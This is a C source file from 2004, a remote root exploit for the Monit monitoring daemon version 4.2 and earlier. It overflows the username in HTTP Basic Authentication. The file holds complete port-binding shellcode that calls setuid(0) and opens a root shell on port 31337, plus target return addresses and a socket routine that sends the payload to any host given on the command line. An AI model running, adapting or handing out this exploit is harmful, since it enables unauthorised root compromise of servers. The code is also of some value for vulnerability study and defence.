/*
 * THE EYE ON SECURITY RESEARCH GROUP - INDIA
 *
 * http://www.eos-india.net/poc/305monit.c
 * Remote Root Exploit for Monit <= 4.2
 * Vulnerability: Buffer overflow in handling of Basic Authentication informations.
 * Server authenticates clients through:
 * Authentication: Basic Base64Encode[UserName:Password]
 * Here we are exploiting the insecure handling of username in Basic Authentication information to return
 * control (EIP) to our payload.
 *
 * Nilanjan De [n2n<at>linuxmail<dot>org] - Abhisek Datta [abhisek<at>front<dot>ru]
 *
 * 06.04.2004
 * http://www.eos-india.net
*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>

#define 	BUFF_SIZE	2048
#define		PADDING		40
#define		EXP_SIZE	(256+4+PADDING)
#define MAX_ARCH 2
struct eos{
	char *arch;
	unsigned long ret;
} targets[] = {
	"Monit-4.2-Gentoo",
	0xbf7fef02,
	//-------------------------------
	"Monit <=4.2 Crash",
	0xbadc0ded,
	NULL,
	0
};
/*
 x86 linux portbind a shell in port 31337
 based on shellcode from www.shellcode.com.ar
 with a few modifications by us
*/
 
char shellcode[]=
        /* sys_fork() */
	"\x31\xc0"                      // xorl         %eax,%eax
	"\x31\xdb"                      // xorl         %ebx,%ebx
	"\xb0\x02"                      // movb         $0x2,%al
	"\xcd\x80"                      // int          $0x80
	"\x38\xc3"                      // cmpl         %ebx,%eax
	"\x74\x05"                      // je           0x5
	/* sys_exit() */
	"\x8d\x43\x01"                  // leal         0x1(%ebx),%eax
	"\xcd\x80"                      // int          $0x80
        /* setuid(0) */
        "\x31\xc0"                      // xorl         %eax,%eax
        "\x31\xdb"                      // xorl         %ebx,%ebx
        "\xb0\x17"                      // movb         $0x17,%al
        "\xcd\x80"                      // int          $0x80
        /* socket() */
        "\x31\xc0"                      // xorl    %eax,%eax
        "\x89\x45\x10"                  // movl    %eax,0x10(%ebp)(IPPROTO_IP = 0x0)
        "\x40"                          // incl    %eax
        "\x89\xc3"                      // movl    %eax,%ebx(SYS_SOCKET = 0x1)
        "\x89\x45\x0c"                  // movl    %eax,0xc(%ebp)(SOCK_STREAM = 0x1)
        "\x40"                          // incl    %eax
        "\x89\x45\x08"                  // movl    %eax,0x8(%ebp)(AF_INET = 0x2)
	"\x8d\x4d\x08"                  // leal    0x8(%ebp),%ecx
        "\xb0\x66"                      // movb    $0x66,%al
        "\xcd\x80"                      // int     $0x80
        "\x89\x45\x08"                  // movl    %eax,0x8(%ebp)

        /* bind()*/
        "\x43"                          // incl    %ebx(SYS_BIND = 0x2)
        "\x66\x89\x5d\x14"              // movw    %bx,0x14(%ebp)(AF_INET = 0x2)
	"\x66\xc7\x45\x16\x7a\x69"      // movw    $0x697a,0x16(%ebp)(port=31337)
        "\x31\xd2"                      // xorl    %edx,%edx
        "\x89\x55\x18"                  // movl    %edx,0x18(%ebp)
        "\x8d\x55\x14"                  // leal    0x14(%ebp),%edx
        "\x89\x55\x0c"                  // movl    %edx,0xc(%ebp)
        "\xc6\x45\x10\x10"              // movb    $0x10,0x10(%ebp)(sizeof(struct sockaddr) = 10h = 16)
        "\xb0\x66"                      // movb    $0x66,%al
        "\xcd\x80"                      // int     $0x80
 
        /* listen() */
        "\x40"                          // incl    %eax
        "\x89\x45\x0c"                  // movl    %eax,0xc(%ebp)
        "\x43"                          // incl    %ebx
        "\x43"                          // incl    %ebx(SYS_LISTEN = 0x4)
        "\xb0\x66"                      // movb    $0x66,%al
        "\xcd\x80"                      // int     $0x80
 
        /* accept() */
        "\x43"                          // incl    %ebx
        "\x89\x45\x0c"                  // movl    %eax,0xc(%ebp)
        "\x89\x45\x10"                  // movl    %eax,0x10(%ebp)
        "\xb0\x66"                      // movb    $0x66,%al
        "\xcd\x80"                      // int     $0x80
        "\x89\xc3"                      // movl    %eax,%ebx
 
        /* dup2() */
        "\x31\xc9"                      // xorl    %ecx,%ecx
        "\xb0\x3f"                      // movb    $0x3f,%al
        "\xcd\x80"                      // int     $0x80
        "\x41"                          // incl    %ecx
        "\x80\xf9\x03"                  // cmpb    $0x3,%cl
        "\x75\xf6"                      // jne     -0xa
 
        /* execve() */
        "\x31\xd2"                      // xorl    %edx,%edx
        "\x52"                          // pushl   %edx
        "\x68\x6e\x2f\x73\x68"          // pushl   $0x68732f6e
        "\x68\x2f\x2f\x62\x69"          // pushl   $0x69622f2f
        "\x89\xe3"                      // movl    %esp,%ebx
        "\x52"                          // pushl   %edx
        "\x53"                          // pushl   %ebx
        "\x89\xe1"                      // movl    %esp,%ecx
        "\xb0\x0b"                      // movb    $0xb,%al
        "\xcd\x80";                     // int     $0x80

void show_help(char *pr00gie,u_short opt) {
	int i=0;
	printf("==========> THE EYE ON SECURITY RESEARCH GROUP <==========\n");
	printf("Monit <= 4.2 Remote Root Exploit\n");
	printf("n2n[at]linuxmail[dot]org - abhisek[at]front[dot]ru\n");
	printf("http://www.eos-india.net\n\n");
	if(!opt)
		return;
	printf("[usage]\n");
	printf("%s [Remote Host] [Remote Port] [Target]\n",pr00gie);
	printf("[Available Targets]\n");
	while(targets[i].arch != NULL) {
		printf("%d. - %s\t - %p\n",(i),targets[i].arch,targets[i].ret);				
		i++;
	}
}
/* Base 64 code ripped from monit src */
/**
 * Base64 encode one byte
 */
static char encode(unsigned char u) {

  if(u < 26)  return 'A'+u;
  if(u < 52)  return 'a'+(u-26);
  if(u < 62)  return '0'+(u-52);
  if(u == 62) return '+';

  return '/';

}
/**
 * Base64 encode and return size data in 'src'. The caller must free the
 * returned string.
 * @param size The size of the data in src
 * @param src The data to be base64 encode
 * @return encoded string otherwise NULL
 */
char *encode_base64(int size, unsigned char *src) {

  int i;
  char *out, *p;

  if(!src)
    return NULL;

  if(!size)
    size= strlen((char *)src);

  out= (char *)malloc(sizeof(char)*size*4/3+4);

  p= out;

  for(i=0; i<size; i+=3) {

    unsigned char b1=0, b2=0, b3=0, b4=0, b5=0, b6=0, b7=0;

    b1 = src[i];

    if(i+1<size)
      b2 = src[i+1];

    if(i+2<size)
      b3 = src[i+2];

    b4= b1>>2;
    b5= ((b1&0x3)<<4)|(b2>>4);
    b6= ((b2&0xf)<<2)|(b3>>6);
    b7= b3&0x3f;

    *p++= encode(b4);
    *p++= encode(b5);

    if(i+1<size) {
      *p++= encode(b6);
    } else {
      *p++= '=';
    }

    if(i+2<size) {
      *p++= encode(b7);
    } else {
      *p++= '=';
    }

  }

  return out;

}


void make_http_request(char *buff,int size,char *host,unsigned long *magic) {
	char *exp_buff;
	char *exp_buff_encoded;
	int i;
	if (!(exp_buff=(char*)malloc(EXP_SIZE))){
		perror("malloc()");
		exit(1);
	}
	
	memset(exp_buff,0x90,EXP_SIZE);
	strcpy(exp_buff+256-strlen(shellcode),shellcode);
	for(i=256;i<EXP_SIZE-5;i+=4)
		memcpy(exp_buff+i,magic,4);
	strcpy(exp_buff+EXP_SIZE-4,":x");
	exp_buff_encoded=encode_base64(EXP_SIZE,exp_buff);	
	memset(buff,0x00,size);
	sprintf(buff,"GET / HTTP/1.0\r\n");
	sprintf(buff,"%sHost: %s\r\n",buff,host);
	sprintf(buff,"%sAuthorization: Basic %s\r\n\r\n\r\n",buff,exp_buff_encoded);
	
}
int main(int argc,char *argv[]) {
	char *host;
	char *b;
	int rport;
	int sockfd;
	struct sockaddr_in sin;
	struct hostent *h;
	unsigned int n;
	unsigned long magic;
	if(argc != 4) {
		show_help(argv[0],1);
		exit(1);
	}
	host=argv[1];
	rport=(atoi(argv[2]));
	n=atoi(argv[3]);
	if((n >= MAX_ARCH)||(n<0)) {
		printf("- Invalid target\n");
		show_help(argv[0],1);
		exit(1);
		}
	magic=targets[n].ret;
	show_help(argv[0],0);
	printf("-Using RET %p\n",magic);
	printf("Resolving %s\t",host);
	h=gethostbyname(host);
	if(!h) {
		printf("[ERROR]\nUnable to resolve: %s\n",host);
		exit(1);
	}
	else
	printf("[DONE]\n");
	b=(char*)malloc(BUFF_SIZE);
	if(!b) {
		perror("malloc");
		exit(1);
	}
	sin.sin_addr=*((struct in_addr*)h->h_addr);
	sin.sin_family=AF_INET;
	sin.sin_port=htons((u_short)rport);
	if((sockfd=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))<0){
		perror("socket");
		exit(1);
	}
	printf("Connecting to %s:%d\t",host,rport);
	if(connect(sockfd,(struct sockaddr*)&sin,sizeof(sin))<0) {
		printf("[ERROR]\nUnable to connect: %s:%d\n",host,rport);
		perror("connect");
		exit(1);
	}
	else
	printf("[DONE]\n");
	make_http_request(b,BUFF_SIZE,host,&magic);
	if(send(sockfd,b,strlen(b),0) == strlen(b))
		printf("Successfully send exploit string\n");
	else
		printf("Failed sending exploit string\n");
	close(sockfd);
	return 0;
}

